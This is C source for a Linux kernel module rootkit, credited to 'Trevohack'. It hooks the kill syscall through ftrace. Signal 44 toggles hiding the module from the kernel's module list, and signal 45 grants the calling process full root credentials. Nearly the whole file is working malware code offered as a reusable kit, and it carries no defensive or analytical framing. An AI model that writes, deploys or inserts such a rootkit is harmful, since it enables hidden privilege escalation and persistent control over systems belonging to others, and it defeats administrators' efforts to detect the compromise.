
/* 

Note: This kit uses ftrace_helper 
Author: Trevohack 

*/


#include <linux/module.h> 
#include <linux/kernel.h> 
#include <linux/cred.h> 
#include <linux/fs.h>       
#include <linux/uaccess.h> 
#include <linux/slab.h>   
#include <linux/dcache.h> 
#include <linux/file.h> 
#include <linux/ptrace.h>

#include "ftrace_helper.h"

MODULE_LICENSE("GPL");
MODULE_AUTHOR("Trevohack");
MODULE_DESCRIPTION("LKM Library: Hook kill");  
MODULE_VERSION("0.02");

static struct list_head *prev_module;
static short hidden = 0;

static asmlinkage long (*orig_kill)(const struct pt_regs *);

asmlinkage long hook_kill(const struct pt_regs *regs)
{
    int sig = regs->si;
    void showme(void);
    void hideme(void);
    void set_root(void);

    if (sig == 44 && hidden == 0) {
        hideme();
        hidden = 1;
        return 0;
    } else if (sig == 44 && hidden == 1) {
        showme();
        hidden = 0;
        return 0;
    } else if (sig == 45) {
        set_root();
        return 0;
    }

    return orig_kill(regs);
}



void showme(void)
{
    list_add(&THIS_MODULE->list, prev_module);
}

void hideme(void)
{
    prev_module = THIS_MODULE->list.prev;
    list_del(&THIS_MODULE->list);
}

void set_root(void)
{
    struct cred *root;
    root = prepare_creds();

    if (root == NULL)
        return;

    root->uid.val = root->gid.val = 0;
    root->euid.val = root->egid.val = 0;
    root->suid.val = root->sgid.val = 0;
    root->fsuid.val = root->fsgid.val = 0;
    commit_creds(root);
}


static struct ftrace_hook hooks[] = {
    HOOK("sys_kill", hook_kill, &orig_kill),
};

static int trev_init(void)
{
    int err;
    err = fh_install_hooks(hooks, ARRAY_SIZE(hooks));
    if (err)
        return err;

    return 0;
}

static void trev_exit(void)
{
    fh_remove_hooks(hooks, ARRAY_SIZE(hooks));
}

module_init(trev_init);
module_exit(trev_exit); 
